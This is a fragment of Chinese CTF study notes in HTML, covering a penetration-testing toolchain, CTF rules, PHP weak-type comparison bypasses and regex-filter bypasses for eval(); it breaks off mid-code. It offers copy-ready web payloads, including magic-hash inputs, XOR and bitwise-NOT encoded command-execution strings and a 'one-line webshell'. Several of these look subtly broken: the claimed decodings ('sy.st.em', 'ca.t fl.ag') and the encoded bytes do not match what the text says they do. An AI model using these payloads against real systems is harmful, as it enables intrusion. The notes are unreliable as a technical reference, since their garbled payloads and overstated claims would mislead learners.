+<ol>
+<li><strong>Nmap (端口扫描神器)</strong></li>
+</ol>
+<ul>
+<li><strong>定位</strong>：网络探测第一工具。</li>
+<li><strong>核心命令</strong>：
+<ul>
+<li><code>nmap -sV 192.168.1.10</code>：全面扫描开放端口及服务版本（查看是存在旧版本漏洞）。</li>
+<li><code>nmap -sC 192.168.1.10</code>：使用默认脚本进行扫描，可快速发现常漏洞。</li>
+</ul>
+</li>
+<li><strong>应用场景</strong>：搭建完靶场后，第一件事就是用它扫描靶场IP。</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li><strong>Dirsearch / Gobuster (目录扫描)</strong></li>
+</ol>
+<ul>
+<li><strong>定位</strong>：发现网站隐藏文件和目录。</li>
+<li><strong>使用</strong>：
+<ul>
+<li><code>python3 dirsearch.py -u http://靶场IP</code></li>
+</ul>
+</li>
+<li><strong>价值</strong>：很多CTF题目或后台地址都藏在隐藏目录里，这是你探索Web深层的眼睛。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>二、 Web漏洞分析与利用 (Web Exploitation)<br>
+针对CTF中最常见的Web题，需要专门的工具辅助分析。</p>
+<ul>
+<li>
+<ol>
+<li><strong>Burp Suite (Web安全标准工具)</strong></li>
+</ol>
+<ul>
+<li><strong>定位</strong>：Web渗透的“瑞士军刀”。</li>
+<li><strong>核心功能</strong>：
+<ul>
+<li><strong>Proxy (代理)</strong>：拦截浏览器请求，修改数据包（测试SQL注入XSS）。</li>
+<li><strong>Scanner (扫描器)</strong>：自动化检测常见漏洞。</li>
+<li><strong>Intruder (暴力破解)</strong>：自动化发送大量请求，用于爆破密码或参爆破。</li>
+</ul>
+</li>
+<li><strong>实操</strong>：在浏览器中配置代理为 <code>127.0.0.1:8080</code>，所有流量都会经Burp，你可以在其中查看、修改、重放任何请求。</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li><strong>SQLMap (SQL注入专用)</strong></li>
+</ol>
+<ul>
+<li><strong>定位</strong>：自动化SQL注入检测与获取数据的利器。</li>
+<li><strong>核心命令</strong>：
+<ul>
+<li><code>sqlmap -u &quot;http://xxx.com/vuln.php?id=1&quot; --dbs</code>：检测定URL是否存在SQL注入，并列出数据库名。</li>
+<li><code>sqlmap -u &quot;http://xxx.com/vuln.php?id=1&quot; --dump -Ddbname -T tablename</code>：导出指定数据库表中的数据。</li>
+</ul>
+</li>
+<li><strong>价值</strong>：解放双手，让你专注于分析注入点，而不是繁琐的手工测试。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>三、 逆向工程与二进制漏洞 (Reverse &amp; Pwn)</p>
+<ul>
+<li>
+<ol>
+<li><strong>Ghidra / IDA Pro (反编译工具)</strong></li>
+</ol>
+<ul>
+<li><strong>定位</strong>：分析二进制程序（exe、elf），将机器码还原为汇编代码，理解程序逻辑。</li>
+<li><strong>用途</strong>：逆向工程、软件破解、漏洞分析。Ghidra是开源免费的，非常适合入门。</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li><strong>pwntools (Pwn解题Python库)</strong></li>
+</ol>
+<ul>
+<li><strong>定位</strong>：CTF二进制方向的核心开发库。</li>
+<li><strong>价值</strong>：结合你已有的Python基础，学习pwntools可以让你快速编写Exploit（漏洞利用脚本）。</li>
+<li><strong>示例</strong>：自动与目标程序交互，发送payload，控制程序流程。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>四、 杂项与流量分析 (Misc &amp; Forensics)<br>
+涵盖隐写术、流量包分析、取证等非传统方向。</p>
+<ul>
+<li>
+<ol>
+<li><strong>Wireshark (流量分析大师)</strong></li>
+</ol>
+<ul>
+<li><strong>定位</strong>：抓包与分析网络流量。</li>
+<li><strong>用途</strong>：在CTF Misc题目中，分析pcapng格式的流量文件，从中提取Flag、账号密码或隐藏信息。</li>
+<li><strong>技巧</strong>：使用 <code>Follow TCP Stream</code> 跟踪TCP连接，查看原始数据。</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li><strong>StegSolve / 010 Editor (隐写术工具)</strong></li>
+</ol>
+<ul>
+<li><strong>定位</strong>：分析图片、音频、视频文件。</li>
+<li><strong>用途</strong>：提取隐藏在图片LSB（最低有效位）、文件尾部的信息，或是破解图片的盲水印。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>五、 你的专属工具链搭建建议</p>
+<ul>
+<li>
+<ol>
+<li><strong>基础环境</strong>：保持Kali Linux / Ubuntu + VSCode 环境。</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li><strong>必装核心工具</strong>：</li>
+</ol>
+<ul>
+<li><strong>浏览器</strong>：Firefox / Chrome (安装SwitchyOmega代理插件，配合Burp)。</li>
+<li><strong>核心工具</strong>：<code>sudo apt install nmap dirsearch sqlmap gobuster</code>。</li>
+<li><strong>逆向工具</strong>：安装 Ghidra。</li>
+</ul>
+</li>
+<li>
+<ol start="3">
+<li><strong>编程扩展</strong>：在VSCode中安装 Python、Pylint、Docker 插件。</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p>六、 快速上手路径</p>
+<ul>
+<li>
+<ol>
+<li><strong>第一步（Web方向）</strong>：在你的DVWA/Pikachu靶场中，用 <strong>Burp Suite</strong> 拦截一次请求，尝试修改参数触发XSS或SQLi。</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li><strong>第二步（自动化）</strong>：用 <strong>Python</strong> 结合 <code>requests</code> 库写一个简单的脚本，批量访问Web路径，体验自动化测试的乐趣。</li>
+</ol>
+</li>
+<li>
+<ol start="3">
+<li><strong>第三步（综合）</strong>：选择一道简单的CTF Web真题，按“信息收集 -&gt; 漏洞分析 -&gt; 工具利用 -&gt; 获取Flag”的流程完整走一遍。<br>
+先从 <strong>Burp Suite</strong> 和 <strong>SQLMap</strong> 入手，吃透这两个工具，你的Web安全学习效率会立刻翻倍。</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CTF比赛规则<br>
+CTF 比赛核心规则围绕<strong>赛制、Flag、评分、纪律</strong>四大板块展开，主流分为 <strong>Jeopardy（解题赛）</strong>、<strong>Attack-Defense（攻防赛）</strong>、<strong>Belluminar（战争与分享）</strong> 与 <strong>混合赛</strong>，不同赛制的规则与流程差异显著。
+<ul>
+<li>一、核心概念与通用规则
+<ul>
+<li><strong>Flag</strong>：比赛中需获取的特定格式字符串（如 <code>flag{xxx}</code>），是得分唯一凭证。</li>
+<li><strong>参赛形式</strong>：以队伍为单位，常见 3–5 人组队，分工明确（Web、Pwn、Reverse、Crypto、Misc 等）。</li>
+<li><strong>通用纪律</strong>：禁止攻击比赛平台、跨队共享答案、暴力破解题目、DDoS 干扰比赛，违规直接判负。</li>
+<li><strong>比赛时长</strong>：解题赛多为 4–12 小时；攻防赛与混合赛常持续 24–48 小时。</li>
+</ul>
+</li>
+<li>二、三大主流赛制详解
+<ul>
+<li>
+<ol>
+<li>Jeopardy（解题赛）——线上选拔赛首选
+<strong>核心流程</strong>：选手在平台自由选题→解题获取 Flag→提交得分→按总分排名。
+<strong>评分规则</strong>：</li>
+</ol>
+<ul>
+<li>题分按难度分级（100–500 分），越难分值越高。</li>
+<li><strong>动态扣分</strong>：解出队伍越多，题分越低，降至保底后不变。</li>
+<li><strong>一血奖励</strong>：前三支解出题目者加额外分（首名 5%、二名 3%、三名 1%）。
+<strong>典型题型</strong>：Web（SQLi、XSS、文件上传）、Pwn（二进制漏洞利用）、Reverse（逆向工程）、Crypto（密码学）、Misc（取证/隐写）、Mobile（移动安全）。
+<strong>适用场景</strong>：新手入门、线上资格赛（如 XCTF 联赛、picoCTF）。</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>Attack-Defense（攻防赛）——线下决赛高对抗
+<strong>核心流程</strong>：每队分配相同靶机（Gamebox）→修漏洞保服务（Defense）→攻对手夺 Flag（Attack）→回合制实时计分。
+<strong>评分规则</strong>：</li>
+</ol>
+<ul>
+<li>初始分数一致，采用<strong>零和机制</strong>。</li>
+<li>攻击成功：夺取对方 Flag，得分；对方同步失分。</li>
+<li>防御成功：服务正常运行则不扣分，部分比赛可加分。</li>
+<li>服务宕机/异常：每回合额外扣分，严重者直接淘汰。</li>
+<li>回合制：每 5–10 分钟为一回合，刷新 Flag 与检查状态。
+<strong>适用场景</strong>：高强度线下决赛（如 DEF CON CTF 决赛、强网杯）。</li>
+</ul>
+</li>
+<li>
+<ol start="3">
+<li>Belluminar（战争与分享）——中国特色混合赛
+<strong>核心流程</strong>：融合解题与攻防→比赛结束后，各队分享出题/解题思路→评委评分。
+<strong>评分规则</strong>：</li>
+</ol>
+<ul>
+<li>总分 = 解题积分（约 60%）+ 出题积分（约 30%）+ 分享评分（约 10%）。</li>
+<li>出题积分：评委评估题目质量，结合最终解题率评分。</li>
+<li>分享评分：PPT 质量、讲解清晰度、思路完整性。
+<strong>适用场景</strong>：国内高校/行业赛事（如 XMan 夏令营、百度杯）。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>三、混合赛（Mix）——综合能力竞技场
+<strong>核心逻辑</strong>：前期通过解题积累初始分，后期进入攻防环节，得分动态增减，最终以总分定胜负。
+<strong>特点</strong>：兼顾解题的广度与攻防的对抗性，常见于线下高级赛事。</li>
+<li>四、比赛全流程速览
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>核心操作</th>
+<th>注意事项</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>赛前准备</td>
+<td>熟悉赛制、准备工具链（Burp、SQLMap、pwntools 等）、组队分工</td>
+<td>提前搭建本地靶场（DVWA、Pikachu）热身</td>
+</tr>
+<tr>
+<td>比赛中</td>
+<td>解题赛：快速信息收集→漏洞分析→提交 Flag；攻防赛：修漏洞+写 Exploit 攻对手</td>
+<td>严格遵守网络隔离，不攻击比赛平台</td>
+</tr>
+<tr>
+<td>赛后</td>
+<td>提交 Writeup（解题赛）、参与分享（Belluminar）、复盘总结</td>
+<td>整理解题思路与工具脚本，沉淀经验</td>
+</tr>
+</tbody>
+</table></div>
+</li>
+<li>五、新手快速上手建议
+<ol>
+<li><strong>优先从 Jeopardy 入门</strong>：易于组织，上手成本低，覆盖 Web、Misc 等基础题型。</li>
+<li><strong>掌握核心工具链</strong>：信息收集（Nmap、Dirsearch）、Web 分析（Burp Suite）、漏洞利用（SQLMap、pwntools）。</li>
+<li><strong>参与低门槛赛事</strong>：XCTF 联赛、picoCTF、HCTF，积累实战经验。</li>
+<li><strong>重视 Writeup</strong>：赛后复盘能深化理解，构建知识体系。</li>
+</ol>
+</li>
+<li>总结<br>
+CTF 比赛规则围绕“获取 Flag、积累得分”展开，不同赛制适配不同场景。新手建议从解题赛起步，逐步掌握攻防能力；无论何种赛制，<strong>合规操作、团队协作、持续复盘</strong>是核心取胜关键。</li>
+</ul>
+</li>
+</ul>
+<h2 id="二解题模式">二、解题模式
+</h2><ul>
+<li>PHP弱类型比较(属于 CTF Web 题型)
+这是CTF Web方向<strong>必考、超高频、入门必掌握</strong>的知识点！
+<ul>
+<li>
+<p>一、PHP弱类型比较是什么？</p>
+<ul>
+<li>
+<ol>
+<li>一句话解释<br>
+PHP有两种比较方式：</li>
+</ol>
+<ul>
+<li><strong><code>===</code> 严格比较</strong>：先判断类型，再判断值，完全一样才相等（安全）</li>
+<li><strong><code>==</code> 弱类型比较</strong>：<strong>自动强制转换类型</strong>，不看类型只看“值差不多”，<strong>极易出漏洞</strong></li>
+</ul>
+</li>
+</ul>
+<p><strong>弱类型比较漏洞 = PHP用 <code>==</code> 做判断时，自动类型转换导致的安全问题</strong></p>
+<ul>
+<li>
+<ol start="2">
+<li>最经典的漏洞规则（背下来就能做题）</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// 字符串 以 数字开头 → 会被转成数字
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s2">&#34;123abc&#34;</span> <span class="o">==</span> <span class="mi">123</span>   <span class="nx">→</span> <span class="k">true</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 字符串 和 数字比较 → 字符串转数字
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s2">&#34;abc&#34;</span> <span class="o">==</span> <span class="mi">0</span>   <span class="nx">→</span> <span class="k">true</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 0 和 任何非数字开头的字符串 都相等
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">0</span> <span class="o">==</span> <span class="s2">&#34;ctf{xxx}&#34;</span>   <span class="nx">→</span> <span class="k">true</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 哈希字符串漏洞（CTF最常考！）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s2">&#34;0e1234&#34;</span> <span class="o">==</span> <span class="mi">0</span>   <span class="nx">→</span> <span class="k">true</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;0e9999&#34;</span> <span class="o">==</span> <span class="mi">0</span>   <span class="nx">→</span> <span class="k">true</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>原因：PHP看到 <code>0e</code> 开头的字符串，会当成<strong>科学计数法 = 0</strong>。</li>
+</ul>
+</li>
+<li>
+<p>二、CTF真实考试形式</p>
+<ul>
+<li>最经典题目示例</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$pass</span> <span class="o">==</span> <span class="s2">&#34;123456&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;flag{xxx}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>你以为要传<code>pass=123456</code>？
+但因为是弱比较 <code>==</code>，你传：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pass=123456abc
+</span></span><span class="line"><span class="cl">pass=123456xyz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>都能拿到flag！</p>
+</li>
+<li>
+<p>最常考的0e哈希漏洞（90%的题都考这个）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;0e123456789012345678901234567890&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>只要传入一个<strong>md5值以0e开头</strong>的字符串即可绕过。</p>
+<p>现成可用Payload（直接复制）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=240610708
+</span></span><span class="line"><span class="cl">a=QNKCDZO
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>三、快速总结</p>
+<ol>
+<li><strong>PHP弱类型比较 = <code>==</code> 自动类型转换产生的漏洞</strong></li>
+<li><strong>属于 CTF Web 方向 → 代码审计类题目</strong></li>
+<li><strong>核心口诀</strong>：</li>
+</ol>
+<ul>
+<li>字符串对比数字 → 转数字</li>
+<li>非数字字符串 == 0 → true</li>
+<li>0e开头的哈希串 == 0 → true（CTF神器）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>MD5/SHA校验
+<ul>
+<li>科学计数法实战</li>
+<li>严比较数组绕过实战</li>
+<li>MD5碰撞实战</li>
+</ul>
+</li>
+<li>代码执行正则绕过实战
+<ul>
+<li>一、前置知识（10秒看懂）
+<ul>
+<li>
+<ol>
+<li>场景
+CTF 里经常出现这种代码：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// 过滤了字母、数字，不让你直接写 system(&#39;cat flag&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z0-9]/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;你被拦截啦！&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><strong>目标</strong>：在<strong>不能用字母 a-z、数字 0-9</strong> 的情况下，执行系统命令拿 Flag！</li>
+<li>
+<ol start="2">
+<li>属于CTF Web</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>二、核心绕过原理
+<ol>
+<li><strong>异或运算（^）</strong>：两个非字母数字字符异或 → 能生成字母！</li>
+<li><strong>取反运算（~）</strong>：对一串字符取反 → 能生成任意字母数字！
+这两个特性可以让我们：
+<strong>不用任何字母数字，照样执行 system(‘cat flag’)</strong></li>
+</ol>
+</li>
+<li>三、异或绕过（最经典）
+<ul>
+<li>原理
+两个不可见字符（符号）异或 = 字母</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">字符 ^ 字符 = 字母
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>最终Payload结构</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">_</span><span class="p">])</span><span class="o">^</span><span class="p">(</span><span class="nx">_GET</span><span class="p">[</span><span class="nx">_</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>拼接后变成：
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">(</span><span class="nx">sy</span><span class="o">.</span><span class="nx">st</span><span class="o">.</span><span class="nx">em</span><span class="p">)(</span><span class="s1">&#39;ca.t fl.ag&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>直接可用Payload（拿Flag神器）</p>
+<ul>
+<li>
+<ol>
+<li>执行 <code>phpinfo();</code></li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">code</span><span class="o">=</span><span class="err">$</span><span class="p">{</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="mi">80</span><span class="o">^%</span><span class="mi">8</span><span class="nx">c</span><span class="o">%</span><span class="mi">9</span><span class="nx">a</span><span class="o">%</span><span class="mi">8</span><span class="nx">c</span><span class="o">%</span><span class="mi">9</span><span class="nx">b</span><span class="o">%</span><span class="mi">8</span><span class="nx">d</span><span class="p">}{</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="mi">80</span><span class="o">^%</span><span class="mi">8</span><span class="nx">c</span><span class="o">%</span><span class="mi">9</span><span class="nx">a</span><span class="o">%</span><span class="mi">9</span><span class="nx">c</span><span class="o">%</span><span class="mi">9</span><span class="nx">b</span><span class="p">}();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="2">
+<li>执行 <code>system('cat flag');</code></li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">code</span><span class="o">=</span><span class="err">$</span><span class="o">~%</span><span class="mi">98</span><span class="o">%</span><span class="mi">88</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">99</span><span class="o">%</span><span class="mi">9</span><span class="nx">A</span><span class="o">%</span><span class="mi">8</span><span class="nx">D</span><span class="o">%</span><span class="mi">8</span><span class="nx">B</span><span class="o">^%</span><span class="mi">8</span><span class="nx">C</span><span class="o">%</span><span class="mi">8</span><span class="nx">A</span><span class="o">%</span><span class="mi">8</span><span class="nx">C</span><span class="o">%</span><span class="mi">8</span><span class="nx">B</span><span class="o">%</span><span class="mi">8</span><span class="nx">C</span><span class="o">%</span><span class="mi">8</span><span class="nx">D</span><span class="o">%</span><span class="mi">8</span><span class="nx">E</span><span class="o">~</span><span class="p">(</span><span class="err">$</span><span class="o">~%</span><span class="mi">9</span><span class="nx">C</span><span class="o">%</span><span class="mi">8</span><span class="nx">C</span><span class="o">%</span><span class="mi">9</span><span class="nx">E</span><span class="o">%</span><span class="mi">8</span><span class="nx">C</span><span class="o">^%</span><span class="mi">8</span><span class="nx">C</span><span class="o">%</span><span class="mi">8</span><span class="nx">A</span><span class="o">%</span><span class="mi">8</span><span class="nx">C</span><span class="o">%</span><span class="mi">8</span><span class="nx">D</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>四、取反绕过（最简单、最稳定）
+<ul>
+<li>
+<p>原理
+对一串二进制取反 → 得到字母</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">~一串字符 = 任意字母
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>最终Payload（最简单，CTF首选）</p>
+<ul>
+<li>执行 <code>system('cat flag')</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">code</span><span class="o">=~%</span><span class="mi">8</span><span class="nx">F</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">8</span><span class="nx">E</span><span class="o">%</span><span class="mi">8</span><span class="nx">E</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="mi">92</span><span class="o">%</span><span class="mi">9</span><span class="nx">B</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="mi">9</span><span class="nx">C</span><span class="o">%</span><span class="mi">9</span><span class="nx">A</span><span class="o">%</span><span class="mi">92</span><span class="o">%</span><span class="mi">95</span><span class="o">%</span><span class="mi">8</span><span class="nx">E</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="mi">92</span><span class="o">%</span><span class="mi">9</span><span class="nx">B</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="mi">91</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>极简一句话马（无字母数字）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">code</span><span class="o">=~%</span><span class="mi">9</span><span class="nx">E</span><span class="o">%</span><span class="mi">9</span><span class="nx">C</span><span class="o">%</span><span class="mi">9</span><span class="nx">A</span><span class="o">%</span><span class="mi">9</span><span class="nx">D</span><span class="o">%</span><span class="mi">8</span><span class="nx">F</span><span class="o">%</span><span class="mi">8</span><span class="nx">D</span><span class="o">%</span><span class="mi">9</span><span class="nx">C</span><span class="o">%</span><span class="mi">9</span><span class="nx">E</span><span class="o">%</span><span class="mi">9</span><span class="nx">B</span><span class="o">%</span><span class="mi">8</span><span class="nx">D</span><span class="o">%</span><span class="mi">9</span><span class="nx">C</span><span class="o">%</span><span class="mi">9</span><span class="nx">A</span><span class="o">%</span><span class="mi">9</span><span class="nx">D</span><span class="o">%</span><span class="mi">8</span><span class="nx">F</span><span class="o">%</span><span class="mi">9</span><span class="nx">C</span><span class="o">%</span><span class="mi">9</span><span class="nx">A</span><span class="o">%</span><span class="mi">9</span><span class="nx">D</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>五、两种绕过对比（快速选）
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>难度</th>
+<th>稳定性</th>
+<th>CTF推荐度</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>异或绕过</td>
+<td>中等</td>
+<td>高</td>
+<td>⭐⭐⭐⭐</td>
+</tr>
+<tr>
+<td>取反绕过</td>
+<td>极简单</td>
+<td>极高</td>
+<td>⭐⭐⭐⭐⭐（强烈推荐）</td>
+</tr>
+<tr>
+<td><strong>CTF做题优先用：取反绕过！</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table></div>
+</li>
+<li>六、CTF真实题目示例
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z0-9]/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
